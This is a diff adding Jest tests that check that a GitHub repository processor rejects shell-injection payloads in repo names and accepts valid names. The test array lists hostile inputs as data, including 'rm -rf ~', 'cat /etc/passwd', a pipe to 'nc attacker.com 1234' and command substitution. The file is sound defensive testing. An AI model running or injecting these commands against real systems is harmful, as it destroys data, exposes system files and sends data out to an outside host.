@@ -87,6 +87,49 @@ describe('Source processor', () => {
       ).rejects.toThrow(/Invalid repository name/);
     });
 
+    test('test_should_reject_shell_injection_when_repo_name_has_shell_metacharacters', async () => {
+      const maliciousRepoNames = [
+        'owner/repo && rm -rf ~',
+        'owner/repo; cat /etc/passwd',
+        'owner/repo | nc attacker.com 1234',
+        'owner/repo`whoami`',
+        'owner/repo$(whoami)',
+        'owner/repo&& malicious-command',
+        'owner/repo; malicious-command',
+        'owner/repo\nmalicious-command'
+      ];
+
+      for (const repoName of maliciousRepoNames) {
+        await expect(
+          processGitHubRepo(repoName, { customRules: [] })
+        ).rejects.toThrow(/Invalid repository name/);
+      }
+    });
+
+    test('test_should_accept_valid_repo_when_name_has_allowed_characters', async () => {
+      // Test that valid repo names with allowed characters would pass validation
+      // Note: We're only testing the validation, not actual cloning
+      const validRepoNames = [
+        'owner/repo',
+        'owner-name/repo-name',
+        'owner_name/repo_name',
+        'owner.name/repo.name',
+        'owner123/repo456',
+        'my-org/my.repo_123'
+      ];
+
+      for (const repoName of validRepoNames) {
+        // The function will fail at clone stage, but should pass validation
+        // We check that it doesn't throw the validation error
+        try {
+          await processGitHubRepo(repoName, { customRules: [] });
+        } catch (error) {
+          // Should fail at clone stage, not validation
+          expect(error.message).not.toContain('alphanumeric characters');
+        }
+      }
+    });
+
     // Skip actual GitHub cloning in unit tests - covered in integration tests
     test.skip('test_should_clone_and_process_when_repo_valid', async () => {
       const results = await processGitHubRepo('owner/repo', {
